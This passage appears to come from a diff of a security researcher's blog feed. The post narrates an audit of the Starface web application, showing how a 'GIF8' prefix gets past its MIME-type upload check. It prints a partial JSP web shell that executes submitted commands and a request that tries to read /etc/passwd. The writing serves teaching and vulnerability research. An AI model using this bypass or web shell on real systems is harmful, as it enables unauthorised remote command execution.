+&lt;p&gt;I drilled down the code starting from the Struts action until I hit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.helpers.FileUploadCheck.checkMimeType()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkMimeType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileUploadCheckException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 270 */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mimeTypes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 276 */&lt;/span&gt;       &lt;span class=&quot;nc&quot;&gt;ContentInfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;magicUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findMatch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt; 
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       
+&lt;span class=&quot;cm&quot;&gt;/* 279 */&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mimeTypes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;noneMatch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMimeType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equalsIgnoreCase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* 280 */&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileUploadCheckException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;jsp.error.upload.wrong.mime.type&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mimeTypes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/*     */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I then followed the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.j256.simplemagic.ContentInfoUtil.findMatch(File)&lt;/code&gt; and you might have realized already that the &lt;strong&gt;namespace changed&lt;/strong&gt;. We hit another library code, no Starface code anymore. Searching at the VM’s file system revealed the JAR file of the library located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webapps/starface/WEB-INF/lib/simplemagic-1.16.jar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The input for the MIME type definitions came from a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic.gz&lt;/code&gt; in the library’s JAR itself. This file was well-structured for every type based on magic bytes and partially subsequent bytes.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0       string          SIMPLE\x20\x20= FITS data
+!:mime  application/fits
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Knowing which image file types were accepted in Starface, I could focus on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic.gz&lt;/code&gt; byte definitions for those. Another principle I try to follow: always try the simpliest things first. Some MIME type definitions included complex byte structure checks, some others didn’t. What I got was this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+0	string		GIF8		GIF image data
+!:mime	image/gif
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The comparisons began at the very first byte of our input stream and checked the first four bytes being equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GIF8&lt;/code&gt;. And indeed, I was able to upload JSP code, even preserving the file extension, with something like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GIF8&amp;lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&amp;gt;
+&amp;lt;%
+%&amp;gt;
+&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;
+Commands with JSP
+&amp;lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&amp;gt;
+&amp;lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&amp;gt;
+&amp;lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&amp;gt;
+&amp;lt;/FORM&amp;gt;
+&amp;lt;pre&amp;gt;
+&amp;lt;%
+if (request.getParameter(&quot;cmd&quot;) != null) {
+    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&amp;lt;BR&amp;gt;&quot;);
+
+    Process p;
+    if ( System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) != -1){
+        p = Runtime.getRuntime().exec(&quot;cmd.exe /C &quot; + request.getParameter(&quot;cmd&quot;));
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I even tried to copy this file into the &lt;strong&gt;Tomcat ROOT directory&lt;/strong&gt; manually and was surprised that Tomcat happily served this file as JSP despite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GIF8&lt;/code&gt; prefix. We learnt something new!&lt;/p&gt;
+
+&lt;p&gt;Current status:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;We could upload a malicious file thanks to a MIME type check bypass.&lt;/li&gt;
+  &lt;li&gt;We didn’t have to hold a special permission but any authenticated user.&lt;/li&gt;
+  &lt;li&gt;We knew the file name and location on the file system.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We didn’t test this with a serialized object instead of a JSP file but wanted to check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CewolfServlet&lt;/code&gt; call first.&lt;/p&gt;
+
+&lt;p&gt;We made a request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.2.103/config/statistic/statrender?img=/etc/passwd&lt;/code&gt; and &lt;strong&gt;hit the breakpoint&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/cewolfhit.png&quot; alt=&quot;CeWolf Hit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;with our desired parameter&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/cewolfparam.png&quot; alt=&quot;CeWolf Param&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and &lt;strong&gt;failed&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/cewolffail.png&quot; alt=&quot;CeWolf Fail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(…twice if you check the processing of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imgKey&lt;/code&gt; more closely).&lt;/p&gt;
+
+&lt;p&gt;No &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.laures.cewolf.storage.FileStorage&lt;/code&gt; object here but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.laures.cewolf.storage.TransientSessionStorage&lt;/code&gt;. Guess what? No &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt; anymore.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Conclusion of this journey&lt;/strong&gt;:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;We managed to find a dangerous file upload.&lt;/li&gt;
+  &lt;li&gt;We failed to chain it with a previously known deserialization issue of a library.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;more-fails&quot;&gt;More Fails&lt;/h1&gt;
+
+&lt;p&gt;You’re looking for more fails? Look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struts.xml&lt;/code&gt; again and draw your own conclusions.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;constant&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;struts.additional.excludedPatterns&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;^(action|method):.*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;constant&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;struts.enable.DynamicMethodInvocation&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;constant&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;struts.devMode&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;last-words&quot;&gt;Last Words&lt;/h1&gt;
+
+&lt;p&gt;This blog post already became a bit too long so I stop here with my fail compilation. I hope you learnt something about the methods I use, common pitfalls and some inspiration for a proper mindset on security code auditing.&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts. A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”. Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland.</summary></entry><entry><title type="html">Bye Bye medium.com</title><link href="http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog.html" rel="alternate" type="text/html" title="Bye Bye medium.com" /><published>2022-05-01T23:00:09+02:00</published><updated>2022-05-01T23:00:09+02:00</updated><id>http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog</id><content type="html" xml:base="http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog.html">&lt;p&gt;No more medium.com in the future. I’ll publish my new blog posts here instead of &lt;a href=&quot;https://medium.com/@frycos&quot;&gt;https://medium.com/@frycos&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="new" /><summary type="html">No more medium.com in the future. I’ll publish my new blog posts here instead of https://medium.com/@frycos.</summary></entry></feed>
